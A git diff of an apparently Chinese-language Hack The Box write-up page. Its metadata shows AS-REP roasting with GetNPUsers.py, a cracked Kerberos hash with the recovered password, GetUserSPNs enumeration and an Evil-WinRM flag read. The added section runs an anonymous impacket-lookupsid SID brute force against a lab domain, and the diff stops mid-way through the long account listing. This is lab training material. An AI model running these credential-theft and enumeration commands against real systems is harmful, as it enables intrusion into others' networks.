@@ -44,7 +44,7 @@
   <meta itemprop="description" content="GetNPUsers.py 使用 GetNPUsers.py 查看是否有用户禁用了 Kerberos 预认证。 ┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb] └─$ GetNPUsers.py -no-pass -dc-ip 10.129.228.115 LicorDeBellota.htb/ -usersfile users.txt Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies $krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68b6b688935e9299d9c217$f9d7a53d1f3afd2ea861b0480a08aae6ad1c2000d9dc46b7d88daa30247ae7e5c664e9531bcde1122b46cb461128b0f09b324df9a4e47a10f98d5f9d6ace1035255024b6b11ed8d4be7531a41494ebd95d7a6b4432daa90bcdc4a11ab2b0f371f9c66fbc89927c1a6775512bcf9af84d9da44f20c42e053c201c2b729b902fe4b86805fb3ac1e54545c923ec87360d899532525c901b70ee5c1624ccdfb3af4b215bf9680fc278146037eab8aa414da55bc0cb65f7588b4b13f94f23ac171f765e97ec271d741af42559f921d7050cb89b9881bd2c283b4342e4ec978c2a8d0535ac0ddfab9fb6c533007beacaa2a17d6af34deca8bd1c02 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] User jari doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User administrador doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User sshd doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set 用 hashcat 爆破出 hash 的值为 Roper4155。 ┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb] └─$ hashcat -m 18200 kaorz.hash /usr/share/wordlists/rockyou.txt hashcat (v7.1.2) starting OpenCL API (OpenCL 3.0 PoCL 6.0&#43;debian Linux, None&#43;Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ==================================================================================================================================================== * Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU /home/kali/.local/share/hashcat/hashcat.dictstat2: Outdated header version, ignoring content Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Minimum salt length supported by kernel: 0 Maximum salt length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Optimizers applied: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt ATTENTION! Pure (unoptimized) backend kernels selected. Pure kernels can crack longer passwords, but drastically reduce performance. If you want to switch to optimized kernels, append -O to your commandline. See the above message to find out about the exact limits. Watchdog: Temperature abort trigger set to 90c Host memory allocated for this attack: 514 MB (27813 MB free) Dictionary cache built: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344392 * Bytes.....: 139921507 * Keyspace..: 14344385 * Runtime...: 1 sec $krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68b6b688935e9299d9c217$f9d7a53d1f3afd2ea861b0480a08aae6ad1c2000d9dc46b7d88daa30247ae7e5c664e9531bcde1122b46cb461128b0f09b324df9a4e47a10f98d5f9d6ace1035255024b6b11ed8d4be7531a41494ebd95d7a6b4432daa90bcdc4a11ab2b0f371f9c66fbc89927c1a6775512bcf9af84d9da44f20c42e053c201c2b729b902fe4b86805fb3ac1e54545c923ec87360d899532525c901b70ee5c1624ccdfb3af4b215bf9680fc278146037eab8aa414da55bc0cb65f7588b4b13f94f23ac171f765e97ec271d741af42559f921d7050cb89b9881bd2c283b4342e4ec978c2a8d0535ac0ddfab9fb6c533007beacaa2a17d6af34deca8bd1c02:Roper4155 Session..........: hashcat Status...........: Cracked Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP) Hash.Target......: $krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68...bd1c02 Time.Started.....: Tue Apr 7 11:07:11 2026 (3 secs) Time.Estimated...: Tue Apr 7 11:07:14 2026 (0 secs) Kernel.Feature...: Pure Kernel (password length 0-256 bytes) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#01........: 3550.5 kH/s (1.41ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 10674176/14344385 (74.41%) Rejected.........: 0/10674176 (0.00%) Restore.Point....: 10665984/14344385 (74.36%) Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#01...: Ryanpenis -&gt; RipBean Hardware.Mon.#01.: Util: 62% Started: Tue Apr 7 11:06:52 2026 Stopped: Tue Apr 7 11:07:14 2026 使用爆破出来的 hash 进一步枚举。 ┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb] └─$ GetUserSPNs.py -dc-ip 10.129.228.115 LicorDeBellota.htb/Kaorz:Roper4155 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies No entries found! GetUserSPNs 使用 GetUserSPNs 枚举注册了 SPN 的域用户，发现有 Administrator。">
   <meta itemprop="datePublished" content="2026-04-13T14:00:00+08:00">
   <meta itemprop="dateModified" content="2026-04-13T14:00:00+08:00">
-  <meta itemprop="wordCount" content="855">
+  <meta itemprop="wordCount" content="2062">
   <meta itemprop="keywords" content="Hack">
 
   <meta name="twitter:card" content="summary">
@@ -135,6 +135,7 @@
     <li><a href="#getnpuserspy">GetNPUsers.py</a></li>
     <li><a href="#getuserspns">GetUserSPNs</a></li>
     <li><a href="#securetsdump">Securetsdump</a></li>
+    <li><a href="#lookupsid">Lookupsid</a></li>
   </ul>
 </nav>
                 </aside>
@@ -365,6 +366,396 @@
 </span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; cd ..<span style="color:#ae81ff">\D</span>esktop
 </span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; type root.txt
 </span></span><span style="display:flex;"><span>5183e6faa81a508920196120306ef1c2
+</span></span></code></pre></div><h2 id="lookupsid">Lookupsid</h2>
+<p>执行 lookupsid 发现用户名。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-lookupsid anonymous@10.129.229.17 <span style="color:#ae81ff">20000</span> | tee Lookupsid_result.txt
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Brute forcing SIDs at 10.129.229.17
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> StringBinding ncacn_np:10.129.229.17<span style="color:#f92672">[</span><span style="color:#ae81ff">\p</span>ipe<span style="color:#ae81ff">\l</span>sarpc<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Domain SID is: S-1-5-21-4194615774-2175524697-3563712290
+</span></span><span style="display:flex;"><span>498: BLACKFIELD<span style="color:#ae81ff">\E</span>nterprise Read-only Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>500: BLACKFIELD<span style="color:#ae81ff">\A</span>dministrator <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>501: BLACKFIELD<span style="color:#ae81ff">\G</span>uest <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>502: BLACKFIELD<span style="color:#ae81ff">\k</span>rbtgt <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>512: BLACKFIELD<span style="color:#ae81ff">\D</span>omain Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>513: BLACKFIELD<span style="color:#ae81ff">\D</span>omain Users <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>514: BLACKFIELD<span style="color:#ae81ff">\D</span>omain Guests <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>515: BLACKFIELD<span style="color:#ae81ff">\D</span>omain Computers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>516: BLACKFIELD<span style="color:#ae81ff">\D</span>omain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>517: BLACKFIELD<span style="color:#ae81ff">\C</span>ert Publishers <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>518: BLACKFIELD<span style="color:#ae81ff">\S</span>chema Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>519: BLACKFIELD<span style="color:#ae81ff">\E</span>nterprise Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>520: BLACKFIELD<span style="color:#ae81ff">\G</span>roup Policy Creator Owners <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>521: BLACKFIELD<span style="color:#ae81ff">\R</span>ead-only Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>522: BLACKFIELD<span style="color:#ae81ff">\C</span>loneable Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>525: BLACKFIELD<span style="color:#ae81ff">\P</span>rotected Users <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>526: BLACKFIELD<span style="color:#ae81ff">\K</span>ey Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>527: BLACKFIELD<span style="color:#ae81ff">\E</span>nterprise Key Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>553: BLACKFIELD<span style="color:#ae81ff">\R</span>AS and IAS Servers <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>571: BLACKFIELD<span style="color:#ae81ff">\A</span>llowed RODC Password Replication Group <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>572: BLACKFIELD<span style="color:#ae81ff">\D</span>enied RODC Password Replication Group <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1000: BLACKFIELD<span style="color:#ae81ff">\D</span>C01$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1101: BLACKFIELD<span style="color:#ae81ff">\D</span>nsAdmins <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1102: BLACKFIELD<span style="color:#ae81ff">\D</span>nsUpdateProxy <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1103: BLACKFIELD<span style="color:#ae81ff">\a</span>udit2020 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1104: BLACKFIELD<span style="color:#ae81ff">\s</span>upport <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1105: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD764430 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1106: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD538365 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1107: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD189208 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1108: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD404458 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1109: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD706381 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1110: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD937395 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1111: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD553715 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1112: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD840481 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1113: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD622501 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1114: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD787464 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1115: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD163183 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1116: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD869335 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1117: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD319016 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1118: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD600999 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1119: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD894905 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1120: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD253541 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1121: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD175204 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1122: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD727512 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1123: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD227380 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1124: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD251003 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1125: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD129328 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1126: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD616527 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1127: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD533551 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1128: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD883784 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1129: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD908329 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1130: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD601590 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1131: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD573498 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1132: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD290325 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1133: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD775986 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1134: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD348433 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1135: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD196444 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1136: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD137694 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1137: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD533886 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1138: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD268320 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1139: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD909590 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1140: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD136813 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1141: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD358090 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1142: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD561870 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1143: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD269538 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1144: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD169035 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1145: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD118321 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1146: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD592556 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1147: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD618519 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1148: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD329802 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1149: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD753480 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1150: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD837541 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1151: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD186980 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1152: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD419600 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1153: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD220786 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1154: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD767820 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1155: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD549571 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1156: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD411740 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1157: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD768095 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1158: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD835725 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1159: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD251977 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1160: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD430864 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1161: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD413242 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1162: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD464763 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1163: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD266096 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1164: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD334058 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1165: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD404213 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1166: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD219324 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1167: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD412798 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1168: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD441593 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1169: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD606328 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1170: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD796301 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1171: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD415829 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1172: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD820995 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1173: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD695166 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1174: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD759042 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1175: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD607290 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1176: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD229506 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1177: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD256791 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1178: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD997545 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1179: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD114762 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1180: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD321206 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1181: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD195757 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1182: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD877328 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1183: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD446463 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1184: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD579980 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1185: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD775126 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1186: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD429587 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1187: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD534956 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1188: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD315276 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1189: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD995218 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1190: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD843883 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1191: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD876916 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1192: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD382769 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1193: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD194732 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1194: BLACKFIELD<span style="color:#ae81ff">\B</span>LACKFIELD191416 <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
